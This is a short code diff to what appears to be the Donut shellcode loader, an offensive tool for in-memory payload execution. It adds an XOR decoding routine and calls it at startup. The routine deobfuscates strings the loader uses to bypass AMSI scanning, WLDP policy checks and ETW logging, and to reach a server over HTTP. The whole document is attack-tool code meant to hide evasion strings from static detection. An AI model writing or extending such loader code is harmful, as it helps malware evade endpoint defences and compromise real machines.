@@ -33,6 +33,38 @@
 
 DWORD MainProc(PDONUT_INSTANCE inst);
 
+static void decode_str(char *s, uint8_t key) {
+    while(*s) {
+      *s++ ^= key;
+    }
+}
+
+static void decode_instance_strings(PDONUT_INSTANCE inst) {
+    decode_str(inst->dll_names, inst->str_key);
+    decode_str(inst->clr, inst->str_key);
+    decode_str(inst->wldp, inst->str_key);
+    decode_str(inst->amsi, inst->str_key);
+    decode_str(inst->wldpQuery, inst->str_key);
+    decode_str(inst->wldpIsApproved, inst->str_key);
+    decode_str(inst->amsiInit, inst->str_key);
+    decode_str(inst->amsiScanBuf, inst->str_key);
+    decode_str(inst->amsiScanStr, inst->str_key);
+    decode_str(inst->ntdll, inst->str_key);
+    decode_str(inst->etwEventWrite, inst->str_key);
+    decode_str(inst->etwEventUnregister, inst->str_key);
+    decode_str(inst->etwRet64, inst->str_key);
+    decode_str(inst->etwRet32, inst->str_key);
+    decode_str(inst->wscript, inst->str_key);
+    decode_str(inst->wscript_exe, inst->str_key);
+    decode_str(inst->dataname, inst->str_key);
+    decode_str(inst->kernelbase, inst->str_key);
+    decode_str(inst->cmd_syms, inst->str_key);
+    decode_str(inst->exit_api, inst->str_key);
+    decode_str(inst->decoy, inst->str_key);
+    decode_str(inst->server, inst->str_key);
+    decode_str(inst->http_req, inst->str_key);
+}
+
 HANDLE DonutLoader(PDONUT_INSTANCE inst) {
     CreateThread_t     _CreateThread;
     GetThreadContext_t _GetThreadContext;
@@ -180,6 +212,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
         goto erase_memory;
       }
     }
+    decode_instance_strings(inst);
     DPRINT("Resolving LoadLibraryA");
     
     inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
